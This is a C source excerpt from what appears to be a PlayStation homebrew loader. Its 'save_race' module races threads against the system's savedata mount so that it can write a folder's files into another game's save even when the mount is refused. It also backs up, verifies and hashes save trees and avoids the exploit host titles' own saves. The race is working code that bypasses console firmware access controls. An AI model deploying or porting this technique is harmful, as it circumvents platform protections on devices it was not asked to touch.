        fmt(r->why, sizeof(r->why), "%s %s failed (errno %d)", what, rel, e);
}

static int held_fd(u32 s, const char *rel)
{
    struct rw_path *p = find_path(rel);
    return p ? p->fd[s] : -1;
}

/* whether fd holds exactly the size bytes the source fd sfd has */
static bool same_bytes(int fd, int sfd, u64 size)
{
    u8 st[0x78];
    if (W.fstat(fd, st) != 0 || *(u64 *)(st + 0x48) != size)
        return false;
    const u64 half = BUF / 2;
    for (u64 off = 0; off < size;) {
        u64 want = size - off < half ? size - off : half;
        if (W.pread(fd, g_buf, want, (s64)off) != (s64)want || W.pread(sfd, g_buf + half, want, (s64)off) != (s64)want ||
            memcmp(g_buf, g_buf + half, want) != 0)
            return false;
        off += want;
    }
    return true;
}

static s32 put_file(u32 s, const struct rw_src *e, const char *src_root, struct save_race_result *r)
{
    char path[512];
    fmt(path, sizeof(path), "%s/%s", src_root, e->rel);
    int sfd = R.open(path, O_RDONLY, 0);
    if (sfd < 0) {
        note(r, "read the source of", e->rel);
        return E_NOENT;
    }
    struct rw_path *p = find_path(e->rel);
    int fd = p ? p->fd[s] : -1;
    if (fd < 0) {
        R.close(sfd);
        note(r, "open (to write)", e->rel);
        return E_ACCES;
    }
    if (!p->made[s] && same_bytes(fd, sfd, e->size)) {
        r->unchanged++;
        R.close(sfd);
        return 0;
    }
    s32 rc = 0;
    for (u64 off = 0; off < e->size;) {
        u64 want = e->size - off < BUF ? e->size - off : BUF;
        if (W.pread(sfd, g_buf, want, (s64)off) != (s64)want) {
            note(r, "read the source of", e->rel), rc = E_NOENT;
            break;
        }
        if (W.pwrite(fd, g_buf, want, (s64)off) != (s64)want) {
            note(r, "write", e->rel), rc = E_ACCES;
            break;
        }
        off += want;
    }
    if (rc == 0 && W.ftruncate(fd, (s64)e->size) != 0)
        note(r, "set the size of", e->rel), rc = E_ACCES;
    if (rc == 0 && W.fsync(fd) != 0)
        note(r, "flush", e->rel), rc = E_ACCES;
    R.close(sfd);
    if (rc == 0) {
        r->written += !p->made[s];
        r->bytes += e->size;
    }
    return rc;
}

/* entries the source lacks in the folders held in slot s (the top and the source's own folders) */
static u32 count_extra(u32 s, const struct rw_src *src, u32 n)
{
    u32 extra = 0;
    struct rw_list *l = page_alloc(sizeof(*l));
    for (u32 i = 0; l && i < G_w.n; i++) {
        struct rw_path *p = &G_w.p[i];
        if (!p->dir || p->fd[s] < 0 || (i > 0 && !p->src))
            continue;
        list_dir(p->fd[s], l);
        for (u32 k = 0; k < l->n; k++) {
            char sub[200];
            join(sub, sizeof(sub), p->rel, l->name[k]);
            if (!in_sce_sys(sub) && !in_source(src, n, sub)) {
                extra++;
                logf("save_race: check: %s is not the source's", sub);
            }
        }
    }
    if (l)
        page_free(l, sizeof(*l));
    return extra;
}

/* every source file read back through the save and compared; what the source lacks counted */
static void verify(u32 s, const struct rw_src *src, u32 n, const char *src_root, struct save_race_result *r)
{
    for (u32 i = 0; i < n; i++) {
        int fd = held_fd(s, src[i].rel);
        if (src[i].dir) {
            r->verify_bad += fd < 0;
            continue;
        }
        char path[512];
        fmt(path, sizeof(path), "%s/%s", src_root, src[i].rel);
        int sfd = R.open(path, O_RDONLY, 0);
        if (sfd < 0 || fd < 0 || !same_bytes(fd, sfd, src[i].size)) {
            r->verify_bad++;
            logf("save_race: check: %s is not the source's", src[i].rel);
        }
        if (sfd >= 0)
            R.close(sfd);
    }
    if (G_w.p[0].fd[s] >= 0) {
        r->extra = count_extra(s, src, n);
    } else {
        r->extra = 0; /* the top was not held: what the listing had and was not removed */
        for (u32 i = 2; i < G_w.n; i++)
            r->extra += !G_w.p[i].src && G_w.p[i].listed && !G_w.p[i].gone[s];
    }
    if (r->extra)
        logf("save_race: check: %u entries the source lacks are in the save", r->extra);
}

/* Whose saves may be written: never SWRR's (either region: Luac0re's save and ghostldr's containers live
 * there), never the running host's own title (Jak X when UltraC0re hosts), never the running title's.  The host
 * comes from the real sceKernelGetAppInfo; if that fails, every exploit host title is refused.  Unlike
 * savedata_is_foreign this also holds with no title running (an ELF payload). */
static char g_host[16];
static bool g_host_done;

static bool title_writable(const char *tid)
{
    static const char *const k_swrr[] = {"CUSA03474", "CUSA03492"}, *const k_hosts[] = {"CUSA07992"};
    for (u32 i = 0; i < ARRAY_SIZE(k_swrr); i++)
        if (strncmp(tid, k_swrr[i], 9) == 0)
            return false;
    if (!g_host_done) {
        g_host_done = true;
        s32 (*info)(s32, u8 *) = host_real("sceKernelGetAppInfo");
        u8 buf[0x80];
        memset(buf, 0, sizeof(buf));
        if (info && K.getpid && info(K.getpid(), buf) == 0 && buf[0x10])
            strlcpy(g_host, (const char *)buf + 0x10, 10);
    }
    if (g_host[0] ? strncmp(tid, g_host, 9) == 0 : false)
        return false;
    if (!g_host[0])
        for (u32 i = 0; i < ARRAY_SIZE(k_hosts); i++)
            if (strncmp(tid, k_hosts[i], 9) == 0)
                return false;
    const char *own = title_ident();
    return !(own && own[0] && strncmp(tid, own, 9) == 0);
}

static bool tid_ok(const char *t)
{
    if (!t || strlen(t) != 9)
        return false;
    for (int k = 0; k < 4; k++)
        if (t[k] < 'A' || t[k] > 'Z')
            return false;
    for (int k = 4; k < 9; k++)
        if (t[k] < '0' || t[k] > '9')
            return false;
    return true;
}

static bool dir_ok(const char *d)
{
    size_t n = d ? strlen(d) : 0;
    if (n == 0 || n > 31 || d[0] == '.')
        return false;
    for (size_t i = 0; i < n; i++) {
        char c = d[i];
        if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' ||
              c == '.'))
            return false;
    }
    return true;
}

static void say(struct save_race_result *r)
{
    logf("save_race: write -> %x: mount %x, slot %u; %u written, %u new, %u unchanged, %u removed, %u folders made, "
         "%lu bytes; check: %u differ, %u left over%s",
         (u32)r->rc, (u32)r->mount_rc, r->slot, r->written, r->created, r->unchanged, r->deleted, r->dirs_made,
         r->bytes, r->verify_bad, r->extra,
         r->needs_exit ? ". CLOSE SWRR NOW to save it: the system writes the save when SWRR closes" : "");
    if (r->why[0])
        logf("save_race: write: %s", r->why);
}

/* without the read-only listing: the files the source rewrites, as the save held them, through their
 * descriptors into the host folder dst */
static s32 backup_held(u32 s, const char *dst, struct save_race_result *r)
{
    mkdirs(dst);
    for (u32 i = 2; i < G_w.n; i++) {
        struct rw_path *p = &G_w.p[i];
        char out[512];
        fmt(out, sizeof(out), "%s/%s", dst, p->rel);
        if (!p->src || p->made[s] || p->fd[s] < 0)
            continue;
        if (p->dir) {
            mkdirs(out);
            continue;
        }
        size_t cut = (size_t)(strrchr_c(out, '/') - out);
        out[cut] = 0, mkdirs(out), out[cut] = '/';
        int o = R.open(out, O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (o < 0) {
            note(r, "back up", p->rel);
            return E_ACCES;
        }
        s64 n = 0;
        for (s64 off = 0; (n = W.pread(p->fd[s], g_buf, BUF, off)) > 0; off += n)
            if (R.write(o, g_buf, (u64)n) != n) {
                n = -1;
                break;
            }
        R.close(o);
        if (n < 0) {
            note(r, "back up", p->rel);
            return E_ACCES;
        }
    }
    return 0;
}

s32 save_race_write(s32 user, const char *tid, const char *dir, const char *src_root, const char *fp,
                    const char *backup, struct save_race_result *r)
{
    static struct save_race_result scratch;
    if (!r)
        r = &scratch;
    memset(r, 0, sizeof(*r));
    if (!tid_ok(tid) || !dir_ok(dir) || !src_root || !src_root[0]) {
        fmt(r->why, sizeof(r->why), "needs a title ID (CUSA12345), the save's folder name and a source folder");
        return r->rc = E_INVAL;
    }
    if (!rw_ready()) {
        fmt(r->why, sizeof(r->why), "this console's libkernel or libSceSaveData lacks a call the write needs");
        return r->rc = E_INVAL;
    }
    /* never SWRR's saves, nor the running host's or title's own */
    if (!title_writable(tid)) {
        fmt(r->why, sizeof(r->why), "%s is SWRR's, the running host's or the running title's: its saves are never "
            "written this way", tid);
        return r->rc = E_ACCES;
    }
    spin_lock(&g_lock);
    s32 rc = 0;
    bool reserved = false;
    struct rw_src *src = page_alloc(sizeof(*src) * SRC_MAX);
    if (!G_w.p)
        G_w.p = page_alloc(sizeof(struct rw_path) * RW_MAXP);
    if ((!g_buf && !(g_buf = page_alloc(BUF))) || !src || !G_w.p) {
        fmt(r->why, sizeof(r->why), "out of memory");
        rc = E_NOMEM;
        goto out;
    }
    u32 nsrc = 0;
    rc = src_walk(src_root, "", 8, src, &nsrc);
    if (rc != 0) {
        fmt(r->why, sizeof(r->why), "the source folder %s can't be read whole (%x; at most %u entries, 8 deep, "
            "plain files)", src_root, (u32)rc, SRC_MAX);
        goto out;
    }
    u32 nfiles = 0;
    for (u32 i = 0; i < nsrc; i++)
        nfiles += !src[i].dir;
    if (!nfiles) {
        fmt(r->why, sizeof(r->why), "the source folder %s holds no save files (besides sce_sys)", src_root);
        rc = E_NOENT;
        goto out;
    }
    rw_reset();
    add_path("", true, false);
    add_path("sce_sys/param.sfo", false, false);
    for (u32 i = 0; i < nsrc; i++)
        if (!add_path(src[i].rel, src[i].dir, true)) {
            fmt(r->why, sizeof(r->why), "the source has more than %u files and folders", RW_MAXP - 2);
            rc = E_NOMEM;
            goto out;
        }
    char t[16], d[32];
    memset(t, 0, sizeof(t)), memset(d, 0, sizeof(d));
    strlcpy(t, tid, 10);
    strlcpy(d, dir, sizeof(d));
    /* with the fingerprint: the save's present tree, read-only, listed (what the source lacks can then go) and
     * backed up, before anything changes */
    if (fp && fp[0]) {
        char mp[16];
        s32 frc = fp_mount(user, t, d, fp, mp);
        if (frc == 0) {
            u32 before = G_w.n;
            bool whole = tgt_walk(mp, "", 6);
            u32 bad = backup && backup[0] ? (mkdirs(backup), plain_copy(mp, backup, "", 6)) : 0;
            s32 urc = R.umount(mp);
            logf("save_race: write: %s:%s read-only with its fingerprint: %u entries only the save has%s; %s; unmount "
                 "-> %x", t, d, G_w.n - before, whole ? "" : " (listing cut short)",
                 backup && backup[0] ? (bad ? "the backup is missing files" : "backed up") : "no backup asked for",
                 (u32)urc);
            if (G_w.clash) {
                fmt(r->why, sizeof(r->why), "%s is a %s in the save and a %s in the source: nothing was written",
                    G_w.clash->rel, G_w.clash->dir ? "file" : "folder", G_w.clash->dir ? "folder" : "file");
                rc = E_INVAL;
                goto out;
            }
            if (bad) {
                fmt(r->why, sizeof(r->why), "backing the save up into %s failed (%u files): nothing was written",
                    backup, bad);
                rc = E_ACCES;
                goto out;
            }
            G_w.prune = whole;
        } else {
            logf("save_race: write: %s:%s with its fingerprint -> %x: what only the save has stays", t, d, (u32)frc);
            if (frc == (s32)0x809F0008) {
                fmt(r->why, sizeof(r->why), "%s:%s: this user has no such save (%x): play the game once first", t, d,
                    (u32)frc);
                rc = frc;
                goto out;
            }
        }
    }
    u8 st[0x78];
    for (u32 n = 0; n < 16 && G_w.nslots < RW_SLOTS; n++) {
        char mp[16];
        fmt(mp, sizeof(mp), "/savedata%u", n);
        if (R.stat(mp, st) != 0)
            G_w.slot[G_w.nslots++] = n; /* ShellCore binds the lowest free one */
    }
    if (!G_w.nslots || gfs_slot_reserve() != 0) {
        fmt(r->why, sizeof(r->why), "no free mount point");
        rc = (s32)0x809F000C;
        goto out;
    }
    reserved = true;
    u64 th[RW_RACERS];
    u32 started = 0;
    for (u32 i = 0; i < RW_RACERS; i++)
        if (R.thread(&th[i], NULL, rw_racer, (void *)(u64)i, "ghostldr_rw") == 0)
            started++;
    K.usleep(20000);
    struct rw_mount1 m;
    memset(&m, 0, sizeof(m));
    m.user = user, m.title = t, m.dir = d, m.mode = 0xa; /* RDWR | DESTRUCT_OFF */
    u8 res[0x40];
    memset(res, 0, sizeof(res));
    G_w.go = 1;
    K.usleep(2000);
    r->mount_rc = R.mount_internal(&m, res, NULL);
    K.usleep(250000);
    G_w.stop = 1;
    /* a racer parked in an open of a slot that never binds may not come back: wait 2 s, then go on without it
     * (G_w.p stays allocated for it) */
    for (u32 w = 0; w < 200 && __atomic_load_n(&G_w.done, __ATOMIC_ACQUIRE) < (int)started; w++)
        K.usleep(10000);
    if (__atomic_load_n(&G_w.done, __ATOMIC_ACQUIRE) == (int)started)
        for (u32 i = 0; i < started; i++)
            R.join(th[i], NULL);
    else
        logf("save_race: write: %d of %u racers still in an open: left behind", (int)started - G_w.done, started);
    /* the slot ShellCore bound: the pinned one with the most descriptors */
    s32 best = -1;
    u32 best_n = 0;
    for (u32 s = 0; s < G_w.nslots; s++) {
        u32 c = 0;
        for (u32 i = 0; i < G_w.n; i++)
            c += G_w.p[i].fd[s] >= 0;
        if (G_w.p[1].fd[s] >= 0 && c > best_n)
            best = (s32)s, best_n = c;
    }
    for (u32 s = 0; s < G_w.nslots; s++)
        if ((s32)s != best)
            for (u32 i = 0; i < G_w.n; i++)
                if (G_w.p[i].fd[s] >= 0)
                    R.close(G_w.p[i].fd[s]), G_w.p[i].fd[s] = -1;
    u32 s = best >= 0 ? (u32)best : 0, missing = 0;
    const char *first = NULL;
    for (u32 i = 2; best >= 0 && i < G_w.n; i++) {
        struct rw_path *p = &G_w.p[i];
        r->dirs_made += p->dir && p->made[s];
        r->created += !p->dir && p->made[s];
        r->deleted += p->gone[s];
        if (p->src && p->fd[s] < 0 && !missing++)
            first = p->rel;
    }
    logf("save_race: write: %s:%s: mount -> %x (%s), %lu opens; slot %d holds %u descriptors (%u of the source's "
         "missing); %u files and %u folders made, %u removed", t, d, (u32)r->mount_rc,
         r->mount_rc == 0 ? "allowed" : "refused after binding", G_w.tries, best >= 0 ? (s32)G_w.slot[best] : -1,
         best_n, missing, r->created, r->dirs_made, r->deleted);
    if (best < 0) {
        fmt(r->why, sizeof(r->why),
            r->mount_rc == 0 ? "mounted, but nothing in it was caught"
                             : "refused (%x) before anything in it could be held: nothing was written",
            (u32)r->mount_rc);
        rc = r->mount_rc ? r->mount_rc : E_NOENT;
        goto out;
    }
    r->slot = G_w.slot[s];
    r->needs_exit = r->mount_rc != 0; /* from here the save stays mounted until SWRR closes */
    /* a console that unbinds a refused save at once leaves only stale descriptors: nothing written to them would
     * be kept (neither 13.60 PS5 nor 12.50 PS4 does that) */
    char mpath[16];
    fmt(mpath, sizeof(mpath), "/savedata%u", r->slot);
    if (r->mount_rc != 0 && R.stat(mpath, st) != 0) {
        fmt(r->why, sizeof(r->why), "the console unbound the refused save at once: a write would not be kept, so "
            "nothing was written");
        rc = E_PERM;
        r->needs_exit = false;
    }
    if (rc == 0 && missing) {
        fmt(r->why, sizeof(r->why), "%u of the source's files and folders could not be held (%s first): nothing was "
            "written%s", missing, first, r->created || r->dirs_made ? " (the new empty ones made stay)" : "");
        rc = E_ACCES;
    }
    /* without the read-only listing: the files about to be rewritten, as they are, for an undo */
    if (rc == 0 && !G_w.prune && backup && backup[0] && (rc = backup_held(s, backup, r)) != 0) {
        char was[120];
        strlcpy(was, r->why, sizeof(was));
        fmt(r->why, sizeof(r->why), "backing the save up failed (%s): nothing was written", was);
    }
    for (u32 i = 0; i < nsrc && rc == 0; i++)
        if (!src[i].dir)
            rc = put_file(s, &src[i], src_root, r);
    if (r->written || r->created || r->deleted || r->dirs_made || rc == 0) /* nothing to check when nothing changed */
        verify(s, src, nsrc, src_root, r);
    if (rc == 0 && (r->verify_bad || (r->extra && G_w.prune))) {
        rc = E_INVAL;
        fmt(r->why, sizeof(r->why), "after writing, %u files differ from the source and %u entries it lacks remain",
            r->verify_bad, r->extra);
    } else if (rc == 0 && r->extra) {
        fmt(r->why, sizeof(r->why), "%u entries only the save has stay (without the game's keystone they are not "
            "removed)", r->extra);
    }
    for (u32 i = G_w.n; i-- > 0;) /* the pin and the root last */
        if (G_w.p[i].fd[s] >= 0)
            R.close(G_w.p[i].fd[s]), G_w.p[i].fd[s] = -1;
    if (r->mount_rc == 0) {
        s32 um = R.umount((const char *)res);
        r->committed = um == 0;
        logf("save_race: write: the mount was allowed: unmount (the commit) -> %x", (u32)um);
    } else if (r->needs_exit) {
        reserved = false; /* its mount point stays taken until SWRR closes, which commits the save */
    }
out:
    if (reserved)
        gfs_slot_release();
    r->rc = rc;
    if (src)
        page_free(src, sizeof(*src) * SRC_MAX);
    spin_unlock(&g_lock);
    say(r);
    return rc;
}

s32 save_race_check(s32 user, const char *tid, const char *dir, const char *src_root, const char *fp,
                    struct save_race_result *r)
{
    static struct save_race_result scratch;
    if (!r)
        r = &scratch;
    memset(r, 0, sizeof(*r));
    if (!tid_ok(tid) || !dir_ok(dir) || !src_root || !fp || strlen(fp) != 64) {
        fmt(r->why, sizeof(r->why), "needs a title ID, the save's folder name, the source folder and the title's "
            "keystone fingerprint");
        return r->rc = E_INVAL;
    }
    if (!rw_ready() || !title_writable(tid)) {
        fmt(r->why, sizeof(r->why), "%s can't be checked here", tid);
        return r->rc = E_ACCES;
    }
    spin_lock(&g_lock);
    s32 rc = 0;
    struct rw_src *src = page_alloc(sizeof(*src) * SRC_MAX);
    if (!G_w.p)
        G_w.p = page_alloc(sizeof(struct rw_path) * RW_MAXP);
    u32 nsrc = 0;
    if ((!g_buf && !(g_buf = page_alloc(BUF))) || !src || !G_w.p)
        rc = E_NOMEM;
    else
        rc = src_walk(src_root, "", 8, src, &nsrc);
    char t[16], d[32], mp[16];
    memset(t, 0, sizeof(t)), memset(d, 0, sizeof(d));
    strlcpy(t, tid, 10);
    strlcpy(d, dir, sizeof(d));
    if (rc == 0 && (r->mount_rc = fp_mount(user, t, d, fp, mp)) != 0) {
        rc = r->mount_rc;
        fmt(r->why, sizeof(r->why), "%s:%s read-only with its fingerprint -> %x", t, d, (u32)rc);
    }
    if (rc == 0) {
        /* the same comparison as after a write, through descriptors on the read-only mount: slot 0 of the table */
        rw_reset();
        G_w.nslots = 1;
        struct rw_path *root = add_path("", true, false);
        add_path("sce_sys/param.sfo", false, false);
        root->fd[0] = R.open(mp, O_RDONLY | O_DIRECTORY, 0);
        for (u32 i = 0; i < nsrc; i++) {
            char path[240];
            fmt(path, sizeof(path), "%s/%s", mp, src[i].rel);
            struct rw_path *p = add_path(src[i].rel, src[i].dir, true);
            if (p)
                p->fd[0] = R.open(path, src[i].dir ? O_RDONLY | O_DIRECTORY : O_RDONLY, 0);
        }
        verify(0, src, nsrc, src_root, r);
        for (u32 i = G_w.n; i-- > 0;)
            if (G_w.p[i].fd[0] >= 0)
                R.close(G_w.p[i].fd[0]), G_w.p[i].fd[0] = -1;
        R.umount(mp);
        if (r->verify_bad || r->extra) {
            rc = E_INVAL;
            fmt(r->why, sizeof(r->why), "%u files differ from the source, %u entries it lacks are there", r->verify_bad,
                r->extra);
        }
    } else if (!r->why[0]) {
        fmt(r->why, sizeof(r->why), "the source folder %s can't be read (%x)", src_root, (u32)rc);
    }
    r->rc = rc;
    if (src)
        page_free(src, sizeof(*src) * SRC_MAX);
    spin_unlock(&g_lock);
    logf("save_race: check %s:%s against %s -> %x%s%s", t, d, src_root, (u32)rc, r->why[0] ? ": " : "", r->why);
    return rc;
}

/* ---- for save tools (hle_fsvsh.c): a writable copy, and whether it changed ---- */

s32 save_fp_copy(s32 user, const char *tid, const char *dir, const char *fp, const char *dst)
{
    if (!tid_ok(tid) || !dir_ok(dir) || !fp || !dst || !rw_ready() || !title_writable(tid))
        return E_INVAL;
    spin_lock(&g_lock);
    s32 rc = (!g_buf && !(g_buf = page_alloc(BUF))) ? E_NOMEM : 0;
    char t[16], d[32], mp[16];
    memset(t, 0, sizeof(t)), memset(d, 0, sizeof(d));
    strlcpy(t, tid, 10);
    strlcpy(d, dir, sizeof(d));
    if (rc == 0)
        rc = fp_mount(user, t, d, fp, mp);
    if (rc == 0) {
        remove_tree(dst, 8);
        mkdirs(dst);
        u32 bad = plain_copy(mp, dst, "", 6);
        if (bad)
            rc = E_ACCES;
        R.umount(mp);
    }
    spin_unlock(&g_lock);
    logf("save_race: %s:%s copied read-only (fingerprint) to %s -> %x", t, d, dst, (u32)rc);
    return rc;
}

/* FNV-1a over the paths, sizes and bytes below host folder dir (sce_sys at the top left out), in listing order of
 * sorted-insensitive walks: the same tree gives the same value */
static u64 digest_tree(const char *dir, const char *rel, int depth, u64 h)
{
    char path[512];
    fmt(path, sizeof(path), rel[0] ? "%s/%s" : "%s", dir, rel);
    int fd = R.open(path, O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0)
        return h;
    struct rw_list *l = page_alloc(sizeof(*l));
    if (l) {
        list_dir(fd, l);
        /* the listing's order is the file system's: sort the names so the value doesn't depend on it */
        for (u32 a = 1; a < l->n; a++)
            for (u32 b = a; b > 0 && strcmp(l->name[b - 1], l->name[b]) > 0; b--) {
                char tmp[128];
                u8 tt = l->type[b];
                memcpy(tmp, l->name[b], 128), memcpy(l->name[b], l->name[b - 1], 128), memcpy(l->name[b - 1], tmp, 128);
                l->type[b] = l->type[b - 1], l->type[b - 1] = tt;
            }
        for (u32 i = 0; i < l->n; i++) {
            if (!rel[0] && strcmp(l->name[i], "sce_sys") == 0)
                continue;
            char sub[200];
            join(sub, sizeof(sub), rel, l->name[i]);
            for (const char *c = sub; *c; c++)
                h = (h ^ (u8)*c) * 0x100000001B3ull;
            h = (h ^ l->type[i]) * 0x100000001B3ull;
            if (l->type[i] == 4) {
                if (depth > 0)
                    h = digest_tree(dir, sub, depth - 1, h);
                continue;
            }
            fmt(path, sizeof(path), "%s/%s", dir, sub);
            int f = R.open(path, O_RDONLY, 0);
            for (s64 n; f >= 0 && (n = R.read(f, g_buf, BUF)) > 0;)
                for (s64 k = 0; k < n; k++)
                    h = (h ^ g_buf[k]) * 0x100000001B3ull;
            if (f >= 0)
                R.close(f);
        }
        page_free(l, sizeof(*l));
    }
    R.close(fd);
    return h;
}

u64 save_tree_digest(const char *dir)
{
    if (!dir || !rw_ready())
        return 0;
    spin_lock(&g_lock);
    u64 h = (!g_buf && !(g_buf = page_alloc(BUF))) ? 0 : digest_tree(dir, "", 8, 0xcbf29ce484222325ull);
    spin_unlock(&g_lock);
    return h;
}

/* for elfldr payloads (ghostldr's resign tool): imports of these names bind here.  src is a path as the
 * payload sees it (its /temp0 is remapped like a title's), which the writer reads with SWRR's own calls. */
static const char *host_src(const char *src, char *buf, size_t size)
{
    u8 st[0x78];
    if (!src || !race_ready())
        return src;
    const char *h = remap_path(src, buf, size);
    return h && R.stat(h, st) == 0 ? h : src;
}

static s32 x_write(s32 user, const char *tid, const char *dir, const char *src, const char *fp, const char *backup,
                   struct save_race_result *r)
{
    char buf[320], bbuf[320];
    const char *b = NULL;
    if (backup && backup[0] && race_ready()) {
        R.mkdir(remap_path(backup, bbuf, sizeof(bbuf)), 0777);
        b = host_src(backup, bbuf, sizeof(bbuf));
    }
    return save_race_write(user, tid, dir, host_src(src, buf, sizeof(buf)), fp, b, r);
}

static s32 x_check(s32 user, const char *tid, const char *dir, const char *src, const char *fp,
                   struct save_race_result *r)
{
    char buf[320];
    return save_race_check(user, tid, dir, host_src(src, buf, sizeof(buf)), fp, r);
}

/* dst: a folder as the payload sees it (made, or emptied first); fp NULL or "" for MountInternal */
static s32 x_copy(s32 user, const char *tid, const char *dir, const char *dst, const char *fp)
{
    char buf[320];
    const char *h = dst && race_ready() ? remap_path(dst, buf, sizeof(buf)) : NULL;
    if (!tid || !dir || !(h ? h : dst))
        return E_INVAL;
    return race_copy(user, tid, dir, h ? h : dst, fp);
}

static const struct ext_hle_ent k_hle[] = {
    {"libGhostldr", "ghostldr_save_race_copy", x_copy, NULL},
    {"libGhostldr", "ghostldr_save_race_write", x_write, NULL},
    {"libGhostldr", "ghostldr_save_race_check", x_check, NULL},
};

static const struct ext_lib k_libs[] = {
    {"libGhostldr", NULL, EXT_LIB_NO_HOST | EXT_LIB_VIRTUAL, E_PERM},
};

EXT_FAMILY_LIBS("save_race", k_hle, k_libs, NULL);
